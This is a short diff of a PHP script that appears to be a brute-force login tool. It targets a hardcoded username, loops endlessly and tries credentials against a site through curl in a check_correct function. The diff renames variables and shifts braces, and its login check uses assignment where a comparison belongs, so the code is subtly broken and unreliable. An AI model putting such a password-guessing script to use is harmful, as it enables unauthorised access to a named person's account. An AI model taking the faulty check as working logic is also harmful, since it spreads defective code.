@@ -1,6 +1,6 @@
 <?php
 
-global $incorrect;
+global $wrong;
 global $startpagina;
 $time = microtime() * 100000;
 $username = "charlotte.scheurleer1";
@@ -18,7 +18,7 @@ while(True) {
 </body>
 </html>";
             
-      
+        }
     
     echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
     <tr>
@@ -29,7 +29,7 @@ ce attack.</b></div>
     </tr>
 </table>";
     
-        }
+        
 }
 echo "</body>
 </html>";
@@ -47,7 +47,7 @@ function check_correct($username, $Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c);
-        if($str = $startpagina) {return true;}
+        if($str = $wrong) {return true;}
         else {return false;}
 }
 
